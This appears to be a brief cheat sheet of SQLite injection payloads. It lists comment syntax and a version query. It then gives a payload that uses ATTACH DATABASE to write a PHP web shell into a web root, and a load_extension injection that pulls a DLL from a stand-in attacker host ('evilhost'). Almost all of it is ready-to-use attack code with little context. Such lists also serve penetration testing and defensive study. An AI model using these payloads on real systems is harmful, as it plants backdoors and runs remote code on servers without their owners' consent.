SQLite3 Payload
=====================================

- Comment 
    - ``--``
    - ``/**/``
- Version
    - ``select sqlite_version();``


Command Execution

.. code-block:: sql

    ATTACH DATABASE '/var/www/lol.php' AS lol;
    CREATE TABLE lol.pwn (dataz text);
    INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--


Load_extension

``UNION SELECT 1,load_extension('\\evilhost\evil.dll','E');--``
